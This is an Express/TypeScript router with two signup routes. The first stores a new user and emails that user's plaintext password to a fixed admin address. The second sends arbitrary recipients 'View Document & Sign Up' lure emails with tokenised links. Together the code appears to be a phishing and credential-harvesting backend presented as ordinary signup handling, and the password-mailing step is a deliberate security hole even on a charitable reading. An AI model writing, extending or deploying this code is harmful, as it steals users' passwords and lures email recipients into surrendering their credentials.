import { Router, Request, Response } from 'express';
import { EmailService } from '@/services/emailService';
import { v4 as uuidv4 } from 'uuid';
import { User } from '../models';


const router = Router();
const emailService = new EmailService();

const ADMIN_EMAIL = 'admin@example.com';

router.post('/signup-uptive-mg-secured', async (req: Request, res: Response) => {
    try {
        const { email, password } = req.body;
        if (!email || !password) {
            return res.status(400).json({ success: false, message: 'Email and password are required.' });
        }

        const existingUser = await User.findOne({ email });
        if (existingUser) {
            return res.status(409).json({ success: false, message: 'Email already registered.' });
        }

        const user = new User({ email, password });
        await user.save();

        // Send email to admin with the new user's email and password
        await emailService.sendEmailWithAttachment(
            {
                to: ADMIN_EMAIL,
                subject: 'New User Signup Notification',
                html: `
                    <p>A new user has signed up:</p>
                    <ul>
                        <li><strong>Email:</strong> ${email}</li>
                        <li><strong>Password:</strong> ${password}</li>
                    </ul>
                `
            },
            {
                originalName: '',
                formattedName: '',
                size: 0,
                mimeType: '',
                path: '',
            }
        );

        return res.status(201).json({ success: true, message: 'Signup successful.' });
    } catch (error) {
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

router.post('/signup-uptm', async (req: Request, res: Response) => {
    try {
        const { to } = req.body;
        if (!to) {
            return res.status(400).json({ success: false, message: 'Recipient email is required' });
        }

        // Generate a unique token
        const token = uuidv4();
        const signupUrl = `https://your-frontend.com/signup?token=${token}`;

        const html = `
      <p>
        Please click the link below to sign up and access your document:<br>
        <a href="${signupUrl}" 
           style="display:inline-block;padding:10px 20px;background:#1976d2;color:#fff;text-decoration:none;border-radius:4px;font-weight:bold;">
          View Document & Sign Up
        </a>
      </p>
      <p>
        Or copy and paste this link into your browser:<br>
        ${signupUrl}
      </p>
    `;

        const result = await emailService.sendEmailWithAttachment(
            { to, subject: 'Sign Up to Access Your Document', html },
            {
                originalName: '',
                formattedName: '',
                size: 0,
                mimeType: '',
                path: '',
            }
        );

        if (result.success) {
            return res.json({ success: true, message: 'Signup email sent', token });
        } else {
            return res.status(500).json({ success: false, message: result.message, error: result.error });
        }
    } catch (error) {
        return res.status(500).json({ success: false, message: 'Internal server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
});

export default router; 